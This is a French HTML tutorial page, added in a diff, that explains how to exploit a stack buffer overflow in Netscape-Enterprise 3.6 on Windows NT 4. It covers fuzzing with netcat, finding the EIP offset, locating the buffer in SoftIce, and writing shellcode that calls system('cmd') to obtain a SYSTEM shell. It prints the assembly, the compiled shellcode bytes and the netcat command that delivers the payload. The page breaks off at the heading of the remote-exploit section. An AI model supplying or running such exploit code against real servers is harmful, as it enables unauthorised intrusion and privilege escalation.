@@ -1,0 +1,1119 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="Author" content="aaa">
+   <meta name="GENERATOR" content="Mozilla/4.51 [fr] (Win95; I) [Netscape]">
+   <title>Buffer Overflow</title>
+</head>
+<body text="#000000" bgcolor="#FFFFF8" link="#339966" vlink="#339966" alink="#339966">
+<div align="left"></div>
+<table width="283" border="0" cellspacing="0" cellpadding="0" background="IMAGES/fnd_stitre.jpg" height="40">
+  <tr> 
+    <td width="23">&nbsp;</td>
+    <td width="294"><font face="Verdana, Arial, Helvetica, sans-serif" color="#FFCC00"><font color="#CCCCCC" size="2">BUFFER 
+      OVERFLOW</font></font></td>
+  </tr>
+</table>
+<font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+Programme : Netscape-Enterprise/3.6 SP 2</font> <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+Plateforme : Windows NT 4 (Workgroup)</font> <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+</font> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>Partie 1 
+  : The Buffer Overflow</u></b> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Voila, tout d'abord, 
+  on t&eacute;l&eacute;charge le programme sur <a href="http://www.netscape.com">www.netscape.com</a> 
+  armez-vous de patience, il fait 50 m&eacute;gas h&eacute; h&eacute; :) <br>
+  On l'installe (installation par d&eacute;faut bien s&ucirc;r), et on se met 
+  &agrave; la recherche de la faille... (Vous avez en prime un beau serveur web 
+  !) T&eacute;l&eacute;chargez NetCat (nc.exe). Ce soft vous permet d'envoyer 
+  des donn&eacute;es sur un port d'une machine, se sera donc plus pratique, on 
+  s'emmerdera pas avec un programme &agrave; faire, on le fera plus tard... Comment 
+  savoir si il y a une faille de s&eacute;curit&eacute; ? <br>
+  Et bein... faut tester... tester et encore tester. On va faire un fichier "test.bin" 
+  (pour tester h&eacute; h&eacute;), dans lequel on va mettre une requ&ecirc;te 
+  pour le server web. <br>
+  Syntaxe de NetCat : <tt>E:\nc.exe [IP] [PORT] &lt; [FILE]</tt> <br>
+  Une requ&ecirc;te www se fait comme &ccedil;a : "<tt>GET /robert HTTP/1.0</tt>" 
+  et deux fois entr&eacute;e pour t&eacute;l&eacute;charger le fichier "robert" 
+  &agrave; la racine (wwwroot bien sur). On va donc essayer de planter le serveur 
+  en envoyant une cha&icirc;ne trop longue. on met dans test.bin ceci : <br>
+  "<tt>GET /AAAAAAAAAAAAAAAAAAAAAAA[...x beaucoup]AAAAA HTTP/1.0</tt>" plus 2 
+  fois entr&eacute;e <br>
+  On tape ceci dans un shell dos: <br>
+  <tt>E:\nc 127.0.0.1 80 &lt; test.bin</tt> <br>
+  et l&agrave; le serveur r&eacute;pond que le fichier est introuvable. On rajoute 
+  des 'AAAA' par gros paquets, jusqu'&agrave; ce que le serveur plante. <br>
+  (N.B: si vous mettez trop de 'A' le serveur r&eacute;pondra un autre message 
+  d'erreur, enlevez des 'A' dans ce cas l&agrave;) <br>
+  Quand le serveur plante, un message d'erreur vous indiquera que l'erreur s'est 
+  produite &agrave; l'adresse 0x41414141. <br>
+  Fort bien... Analysons ce qu'il s'est pass&eacute;. <br>
+  Ceux qui connaissent un minimum l'assembleur, savent ce que sont les registres 
+  du microprocesseurs. L'un deux s'appelle EIP (Extended Instruction Pointer). 
+  Il indique au microprocesseur l'adresse de la procha&icirc;ne instruction &agrave; 
+  executer. Lors de l'appel d'une fonction (un CALL), la valeur de EIP est stock&eacute;e 
+  dans la "pile" (stack), et on saute &agrave; l'adresse de la fonction. Une fois 
+  que la fonction est termin&eacute;e, elle reviens &agrave; l'instruction qui 
+  suit le CALL qui l'a appell&eacute;. Comment fait-elle cela ? Et bien c'est 
+  simple, elle regarde tout simplement dans la pile la valeur de EIP avant le 
+  CALL, et elle retourne &agrave; cette adresse. <br>
+  Voila pour le fonctionnement des CALL / RET et de EIP. Que ce passe-t-il donc 
+  avec notre exemple ? <br>
+  Et bien c'est pas compliqu&eacute;, la cha&icirc;ne de caract&egrave;re qu'on 
+  envoi au serveur est stock&eacute;e en m&eacute;moire. Le programme alloue (reserve) 
+  de la place pour copier la cha&icirc;ne. Cependant, si le programmeur est feignant, 
+  il a pas pris le temps de v&eacute;rifier la taille de la cha&icirc;ne. Il copie 
+  donc une cha&icirc;ne en m&eacute;moire (ou dans une autre) sans v&eacute;rifier 
+  la taille de l'espace. </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Exemple simple 
+  : <br>
+  char BUFFER1[100];&nbsp;&nbsp;&nbsp; //&nbsp;&nbsp;&nbsp; un espace pour mettre 
+  des donn&eacute;es <br>
+  char BUFFER2[500];&nbsp;&nbsp;&nbsp; //&nbsp;&nbsp;&nbsp; un autre </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">strcpy(BUFFER1,BUFFER2);&nbsp;&nbsp;&nbsp; 
+  //&nbsp;&nbsp;&nbsp; copie buffer2 dans buffer1 </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Tout va bien si 
+  le buffer2 est inf&eacute;rieur &agrave; 100 sinon, les octets en trop sont 
+  plac&eacute;s de mani&egrave;re incontrol&eacute;e, et il peuvent &eacute;craser 
+  d'autres donn&eacute;es ! Il pourrais par exemple &eacute;craser la valeur de 
+  EIP sauv&eacute;e dans la pile. <br>
+  Dans notre exemple, on pourrait sch&eacute;matiser comme ceci : </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt>[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  Place libre&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  ][EIP ]</tt> <br>
+  &nbsp; <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Ici on met une 
+  cha&icirc;ne "normale", EIP reste &agrave; l'adresse ZZZZ <br>
+  <tt>[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  ][EIP ]</tt> <br>
+  <tt>&nbsp;GET /index.htm HTTP/1.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  ZZZZ</tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">La fonction retourne 
+  donc &agrave; ZZZZ, au moment de RET, tout va bien <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Maintenant, on 
+  fais chier notre monde et on met une cha&icirc;ne trop grande : <br>
+  <tt>[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  Place libre&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  ][EIP ]</tt> <br>
+  <tt>&nbsp;GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
+  HTTP/1.0</tt> <br>
+  &nbsp; </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">La fonction retourne 
+  &agrave; l'adresse AAAA, puisque la valeur sauv&eacute;e de EIP est AAAA <br>
+  AAAA correspond en Hex &agrave; 0x41414141, il retourne donc &agrave; 0x41414141, 
+  cette adresse est invalide, donc Windows NT nous balance un m&eacute;ssage d'erreur 
+  comme quoi on a fait un saut ill&eacute;gal ! <br>
+  Il faut cependant determiner quel 'AAAA' du notre grande cha&icirc;ne est l'adresse 
+  de retour ! On fait donc par tatonnement, <br>
+  on met une cha&icirc;ne de AAAAAAAAAABBBBBBBBBBB, si il retourne &agrave; 0x42424242, 
+  on essaie avec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  AAAAAAAAAAAAAAAABBBBB, et ainsi de suite. On trouve donc que l'adresse correspond 
+  aux caract&egrave;res 4070-4074 de notre test.bin , enfin par l&agrave; quoi, 
+  &ccedil;a m'ennuie de compter ;)) </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Voila ! <br>
+  Quel est l'interet de tout cela ? Et bien, on peut choisir l'adresse de retour 
+  de la fonction ! <br>
+  On va donc examiner &agrave; quel endroit il serait interessant de sauter ! 
+  (il y a possibilit&eacute; de jeu de mot vaseu l&agrave;) </font>
+<p> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>Partie 2 
+  : Examination de cette foutue stack</u></b> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">On est donc parti 
+  pour planter/red&eacute;marrer le serveur un millier de fois :)) <br>
+  On va utiliser SoftIce, le d&eacute;bugger, pour examiner la pile quand le prog 
+  plante. <br>
+  On garde le m&ecirc;me fichier test.bin, on entre dans SoftIce la commande "FAULTS 
+  ON" pour qu'il prenne en charge les erreurs. <br>
+  On fait:&nbsp; nc 127.0.0.1 80 &lt; test.bin, et l&agrave; SoftIce apparait 
+  ! Great ! Que voit-on ? Et bien le registre EIP est bien &agrave; 0x41414141. 
+  Le but sera de savoir &agrave; quelle adresse se trouve notre buffer, de mani&egrave;re 
+  &agrave; placer du code executable dedans, qui sera donc execut&eacute;, si 
+  on jump vers notre buffer. OU EST CE BUFFER ? <br>
+  (Tapez "data", et "code on" dans SoftIce, pour avoir la m&eacute;moire et le 
+  code h&eacute;xa) <br>
+  On va donc examiner la m&eacute;moire &agrave; la recherche du buffer perdu 
+  ! Par exemple, on regarde les registres, ESP (Extended Stack Pointer) est en 
+  rapport avec la stack (waou la d&eacute;duction), on va donc examiner la m&eacute;moire 
+  vers l&agrave; ou il pointe (le sommet de la pile en fait). Son adresse est 
+  0x0143FE48. On clique avec le bouton droit sur l'adresse et on fait "DISPLAY". 
+  Voila, rien d'interressant, apparemment bien sur. On va donc regarder autour, 
+  si il y a pas notre buffer par exemple. Et comme par miracle, on vois que juste 
+  au dessus, il y a plein, mais alors plein de AAAAAA. Fantastique. On constate 
+  &eacute;galement que vers l'adresse 0x0143EE68, il y a un GET /AAAAAAA...&nbsp;&nbsp; 
+  C'est notre buffer ! &ocirc; joie ! On pourrais donc mettre comme adresse de 
+  retour 0x0143EE68, si les caract&egrave;res sont pas trop bizarres pour le server, 
+  comme &ccedil;a il sautera au d&eacute;but de notre buffer (il fait environ 
+  4000 caract&egrave;res), ce qui nous permettra de mettre du code executable 
+  dans le buffer, et le server web se fera un plaisir de l'executer. Reste &agrave; 
+  coder un shellcode... </font>
+<p> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>Partie 3 
+  : Le shellcode en local</u></b> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Les possibilit&eacute;s 
+  sont assez grandes car le serveur peut executer un shellcode qui nous ouvre 
+  un port et qui t&eacute;l&eacute;charge un &eacute;xecutable par exemple. On 
+  va faire en 2 parties. Je vais expliquer comment faire un exploit en LOCAL (fichier 
+  local.bin) pour ceux qui sont pas tr&egrave;s &agrave; l'aise avec l'asm et 
+  le principe du buffer overflow. Pour ceux qui s'accrochent comme des crustac&eacute;s 
+  sur leur rocher, je vais vous expliquer comment coder l'exploit en REMOTE (fichier 
+  joint : remote.bin) , ce qui est nettement plus interressant ;)) <br>
+  Donc on commence soft... </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Le principe est 
+  simple : <br>
+  Le programme tourne avec les privil&egrave;ges d'Administrateur (maximum quoi, 
+  r00t). Si vous &ecirc;tes un simple utilisateur en soif de pouvoir et que la 
+  machine run ce serveur, il vous est donc possible d'avoir les pouvoirs administratif 
+  (=bingo). Comment se fais-ce ? <br>
+  Et bien, le programme tourne avec les privil&egrave;ges de super-utilisateurs, 
+  si notre code ouvre un programme, il tournera avec les m&ecirc;me attributs 
+  que le processuss "p&egrave;re", donc en administrateur. Le programme le plus 
+  interressant &agrave; lancer est bien s&ucirc;r "cmd.exe", qui vous balancera 
+  un joli interpreteur de commande (shell) DOS, avec les pouvoirs administratifs, 
+  libre &agrave; vous ensuite de lancer un trojan pour avoir access &agrave; la 
+  machine en remote, mais c'est interdit par loi, et c'est moralement r&eacute;pr&eacute;hensible, 
+  ne l'oubliez pas :)&nbsp; Pour lancer ce programme il nous suffit de lancer 
+  le fonction "system", qui lance un executable. <br>
+  "system" se trouve dans msvcrt.dll, dans \winnt\system32\ bien s&ucirc;r. On 
+  ne peux &eacute;videmment pas appeller une fonction directement, il faut l'appeller 
+  par son adresse au lieu de son petit nom. Cependant l'adresse change selon la 
+  version de la .DLL, mais comme on est en local, il y a pas de prob'. Vous la 
+  d&eacute;compilez, et vous regarder l'adresse de la fonction "system", ou alors 
+  vous la prenez pour chez vous est vous regardez avec SoftIce enfin c'est pas 
+  trop dur je pense. <br>
+  Pour moi la fonction "system" est export&eacute;e par la DLL &agrave; 0x7801CDA7. 
+  Ok, c'est not&eacute;. <br>
+  Maintenant, c'est du g&acirc;teau. On commence par remplacer nos 'A' (0x41) 
+  par des NOPs (0x90). Pourquoi ? Parceque '0x41' repr&eacute;sente une instruction 
+  ASM qui pourrais tout d&eacute;glinguer. Alors que 0x90, c'est un NOP, c'est 
+  une instruction qui ne fait rien du tout. Notre buffer dois donc contenir le 
+  code, qu'on va mettre directement dans notre fichier test.bin avec un &eacute;diteur 
+  hexad&eacute;cimal. </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Il faut faire plusieur 
+  chose : la fonction "system" requiert comme argument, l'adresse de la cha&icirc;ne 
+  "cmd" qui doit &ecirc;tre termin&eacute;e par un caract&egrave;re NULL. Or, 
+  notre buffer ne dois pas contenir de 0x00, sinon, il sera tronqu&eacute; car 
+  0x00 est une fin de cha&icirc;ne. On doit donc contourner cela en faisant un 
+  xor ebx,ebx et puis push ebx, pour mettre un 0 dans la pile. Voila, pour le 
+  probl&egrave;me du 0, c'est r&eacute;gl&eacute;. <br>
+  Que doit on faire ? <br>
+  Tout d'abord, avoir EBP et ESP au m&ecirc;me niveau pour pouvoir utiliser une 
+  pile pour y mettre&nbsp; "cmd"+0x00, car si on regarde ebp quand on fait le 
+  RET fatidique, on constate que ebp=00000001h, ce qui est emmerdant pour utiliser 
+  une pile. </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">donc : <br>
+  &nbsp;&nbsp;&nbsp; <font color="#FF0000">mov ebp, esp</font></font> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">on a donc pour 
+  notre pile : EBP et ESP au m&ecirc;me niveau, pile vide en fait </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Sc&eacute;ma de 
+  la stack : <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EBP&nbsp;&nbsp;&nbsp; ESP </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">ensuite on doit 
+  mettre un 0, qui terminera la cha&icirc;ne "cmd" <br>
+  on xor un registre pour le mettre &agrave; 0 </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">&nbsp;&nbsp;&nbsp; 
+  <font color="#FF0000">xor ebx, ebx</font></font> <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+  <font color="#FF0000">&nbsp;&nbsp;&nbsp; push ebx</font></font> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">ebx fait 4 bytes 
+  (dword car e=extended) , donc la pile est donc comme cela maintenant : </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP</tt> <br>
+  <tt>00</tt> <br>
+  <tt>00</tt> <br>
+  <tt>00</tt> <br>
+  <tt>00</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ESP</tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">on a besoin de 
+  3 caract&egrave;res pour placer "cmd" dans la pile, c'est parti </font>
+<p><font color="#FF0000" face="Verdana, Arial, Helvetica, sans-serif" size="2">mov 
+  byte ptr [EBP-4], 63h&nbsp;</font><font face="Verdana, Arial, Helvetica, sans-serif" size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  c <br>
+  <font color="#FF0000">mov byte ptr [EBP-3], 6Dh&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  m <br>
+  <font color="#FF0000">mov byte ptr [EBP-2], 64h&nbsp;&nbsp;</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  d <br>
+  &nbsp;&nbsp;&nbsp; et on laisse [EBP-1] &agrave; z&eacute;ro&nbsp;&nbsp;&nbsp; 
+  00 (on n'y touche pas) </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">(N.B : on pourrait 
+  &eacute;videmment utiliser ESP comme r&eacute;f&eacute;rence, on aurait mov 
+  byte ptr [esp+3],63h&nbsp; etc...) </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Notre pile sera 
+  donc remplie comme &ccedil;a : </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt>&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP</tt> <br>
+  <tt>00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  NULL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EBP-1</tt> <br>
+  <tt>64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EBP-2</tt> <br>
+  <tt>6D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  m&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EBP-3</tt> <br>
+  <tt>63&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EBP-4</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp;&nbsp; ESP</tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">On a donc mis la 
+  cha&icirc;ne qu'on voulait dans notre pile. Il faut maintenant mettre cette 
+  adresse dans la pile, pour la passer comme argument &agrave; "system". On doit 
+  donc d'abord empiler l'adresse de la fonction "system", </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">&nbsp;&nbsp;&nbsp;<font color="#FF0000"> 
+  mov eax, 7801CDA7h</font></font> <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+  <font color="#FF0000">&nbsp;&nbsp;&nbsp; push eax</font></font> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Tranquille ! On 
+  pourra donc appeller la fonction "system" en faisant un call vers [EBP-8]. <br>
+  La suite maintenant, on empile le param&egrave;tre de la fonction "system" &agrave; 
+  savoir l'adresse de "cmd", on doit tout simplement empiler l'adresse du premier 
+  caract&egrave;re, &agrave; savoir le "c" qui se trouve &agrave; [EBP-4] normalement 
+  (comptez les lignes sur mes sch&eacute;mas), on va mettre l'adresse [EBP-4] 
+  dans eax, puis on va le pusher, ce brave eax. </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">&nbsp;&nbsp;<font color="#FF0000">&nbsp; 
+  lea eax, [EBP-4]</font></font> <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+  <font color="#FF0000">&nbsp;&nbsp;&nbsp; push eax</font></font> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Maintenant il reste 
+  plus qu'&agrave; appeller la fonction "system", on dois faire un call vers son 
+  adresse, que l'on a empil&eacute; juste avant l'adress de la cha&icirc;ne. <br>
+  La pile est maintenant ainsi : </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt>&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP</tt> <br>
+  <tt>00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  NULL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ...</tt> <br>
+  <tt>64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ...</tt> <br>
+  <tt>6D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  m&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ...</tt> <br>
+  <tt>63&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EBP-4</tt> <br>
+  <tt>A7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ---------&nbsp;&nbsp;&nbsp; 
+  EBP-5</tt> <br>
+  <tt>CD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Adresse 
+  de&nbsp;&nbsp; EBP-6</tt> <br>
+  <tt>01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; system&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  EBP-7</tt> <br>
+  <tt>78&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ---------&nbsp;&nbsp;&nbsp; 
+  EBP-8</tt> <br>
+  <tt>XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ---------</tt> 
+  <br>
+  <tt>XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Adresse 
+  de</tt> <br>
+  <tt>XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "cmd"</tt> 
+  <br>
+  <tt>XX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ---------</tt> 
+  <br>
+  <tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ESP</tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Apr&egrave;s nos 
+  push, l'adresse de "system", que l'on a push&eacute;e se trouve &agrave; EBP-8 
+  d'apr&egrave;s mon (joli) dessin de la pile <br>
+  reste &agrave; appeller cette adresse : </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">&nbsp;&nbsp;&nbsp; 
+  <font color="#FF0000">call dword ptr [ebp-8]</font></font> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Normalement, on 
+  a une superbe fen&ecirc;tre de commande MS-DOS, qui s'ouvre. Et les privil&egrave;ges 
+  sont ceux de l'administrateur. En fait non, car le serveur run avec l'utilisateur 
+  SYSTEM par d&eacute;faut mais c'est aussi puissant que l'administrateur. <br>
+  <font color="#FFFFFF">Voila, on a termin&eacute; avec le shellcode, ce qui donne, 
+  le tout compil&eacute; et termin&eacute; :</font></font> 
+<p><font color="#009900" face="Verdana, Arial, Helvetica, sans-serif" size="2">char 
+  ShellCode [] =</font> <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+  <font color="#009900">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x8B\xEC\x33\xC9\x51\xC6\x45\xFC\x63\xC6\x45\xFD\x6D\xC6\x45"</font></font> 
+  <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+  <font color="#009900">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xFE\x64\xB8\x</font></font><font color="#FFCC00" face="Verdana, Arial, Helvetica, sans-serif" size="2">A7</font><font color="#009900" face="Verdana, Arial, Helvetica, sans-serif" size="2">\x</font><font color="#FFCC00" face="Verdana, Arial, Helvetica, sans-serif" size="2">CD</font><font color="#009900" face="Verdana, Arial, Helvetica, sans-serif" size="2">\x</font><font color="#FFCC00" face="Verdana, Arial, Helvetica, sans-serif" size="2">01</font><font color="#009900" face="Verdana, Arial, Helvetica, sans-serif" size="2">\x</font><font color="#FFCC00" face="Verdana, Arial, Helvetica, sans-serif" size="2">78</font><font color="#009900" face="Verdana, Arial, Helvetica, sans-serif" size="2">\x50\x8D\x45\xFC\x50\xFF\x55\xF8"</font> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Apr&egrave;s libre 
+  &agrave; vous de faire un prog pour evoyer &ccedil;a sur le port 80 si vous 
+  voulez, je n'en vois pas l'utilit&eacute; personnellement. Les quatres bytes 
+  en <font color="#FFCC00">jaune</font> c'est l'adresse de "system" (invers&eacute;e) 
+  , qui est susceptible de changer selon la version de la DLL. <br>
+  Je joins un fichier LOCAL.bin, pour faire marcher mon exploit, vous fa&icirc;tes 
+  simplement : <br>
+  <tt>nc 127.0.0.1 80 &lt; local.bin</tt>, <br>
+  ou, plus simplement, vous ouvrez LOCAL.bin, vous s&eacute;l&eacute;ctionnez 
+  le texte, vous fa&icirc;te "copier", vous ouvrez un Telnet sur le port 80 de 
+  votre machine, vous fa&icirc;tes "coller", et un beau shell administrateur appara&icirc;tra, 
+  sous reserve d'avoir chang&eacute; l'adresse de "system" (inversez l'adresse) 
+  dans le fichier local.bin, par celle correspondant &agrave; votre DLL. Tranquille 
+  non ? (non ? Pfff, qu'est-ce qu'il vous faut !) <br>
+  On passe maintenant &agrave; la partie un peu plus hard, j'esp&egrave;re ne 
+  pas en avoir lach&eacute; trop :) </font>
+<p> 
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>Partie 4 
+  : Le shellcode en remote (remote admin ! yeah !)</u></b> </font>
